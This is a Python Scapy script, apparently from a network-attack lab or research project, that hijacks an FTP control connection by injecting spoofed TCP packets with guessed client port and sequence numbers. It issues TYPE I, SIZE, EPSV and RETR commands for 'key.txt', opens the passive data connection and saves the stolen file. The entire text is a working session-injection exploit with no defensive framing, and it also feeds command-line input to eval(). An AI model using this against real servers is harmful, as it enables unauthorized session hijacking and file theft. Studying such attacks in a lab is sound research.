
import struct
from tabnanny import verbose
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
import random
scapy.config.conf.use_pcap = True

attacker_private_ip = ""
remote_server_ip = ""

remote_server_port = 21
guessed_client_port = 0 # to be inferred
packet_iface = ""

sniff_filter = ""

def getfile(file_server_port):
    global remote_server_ip, packet_iface
    file_client_port = random.randint(50000, 60000)
    try:
        spk1 = IP(src=attacker_private_ip, dst=remote_server_ip)/TCP(dport=file_server_port,sport=file_client_port,flags="S")
        res1 = srp1(spk1, iface = packet_iface)
        seq2 = res1[TCP].ack
        ack2 = res1[TCP].seq + 1
        spk2 = IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(dport=file_server_port,sport=file_client_port,seq=seq2, ack=ack2,flags="A")
        sendp(spk2, iface = packet_iface)
    except Exception as e:
        print(e)


def capture(pkt):
    global attacker_private_ip, guessed_client_port, remote_server_ip, remote_server_port, packet_iface
    if pkt.haslayer(Raw):
        print(bytes(pkt['Raw']))
        if b'200 Switching to Binary mode' in bytes(pkt['Raw']):
            sendp(IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(bytes(pkt['Raw'])), sport=guessed_client_port, dport=remote_server_port,flags="PA")/"SIZE key.txt\r\n", iface=packet_iface)
        elif bytes(pkt['Raw']) == b'213 10\r\n':
            sendp(IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(bytes(pkt['Raw'])), sport=guessed_client_port, dport=remote_server_port,flags="PA")/"EPSV\r\n", iface=packet_iface)
        elif b'229 Entering Extended Passive Mode' in bytes(pkt['Raw']):
            #send an ACK
            sendp(IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(bytes(pkt['Raw'])), sport=guessed_client_port, dport=remote_server_port,flags="A"), iface=packet_iface)
            packet_payload = pkt['Raw']
            payload_str = bytes(packet_payload).decode('utf-8')
            print(payload_str)
            tmp_port = payload_str[-9:-4]
            if '|' in tmp_port:
                file_server_port = int(tmp_port[1:])
            else:
                file_server_port = int(tmp_port)
            print("file_server_port", file_server_port)
            getfile(file_server_port)

            sendp(IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(seq=pkt[TCP].ack,ack=pkt[TCP].seq+len(bytes(pkt['Raw'])), sport=guessed_client_port, dport=remote_server_port, flags="PA")/"RETR key.txt\r\n", iface=packet_iface)
        else:
            if b'1234' in bytes(pkt['Raw']):
                print("got the file")

                print(bytes(pkt['Raw']))
                with open("../complete_attack/key.txt", "wb") as f:
                    f.write(bytes(pkt['Raw']))
                exit(0)

def sniff_packets():
    global sniff_filter
    sniff(filter=sniff_filter, prn=lambda x: capture(x), iface=packet_iface)


def main():
    global attacker_private_ip, guessed_client_port, remote_server_ip, remote_server_port, sniff_filter, packet_iface

    attacker_private_ip = sys.argv[1]
    guessed_client_port = eval(sys.argv[2])
    remote_server_ip = sys.argv[3]
    remote_server_port = eval(sys.argv[4])


    seq = eval(sys.argv[5])
    ack = eval(sys.argv[6])
    packet_iface = sys.argv[7]

    sniff_filter = "tcp and host " + remote_server_ip +" and port not 22"
    t=Thread(target=sniff_packets)
    t.start()
    
    sendp(IP(src=attacker_private_ip,dst=remote_server_ip)/TCP(seq=ack, ack=seq, sport=guessed_client_port, dport=remote_server_port,flags="PA")/ "TYPE I\r\n", iface=packet_iface)


if __name__ == '__main__':
    main()

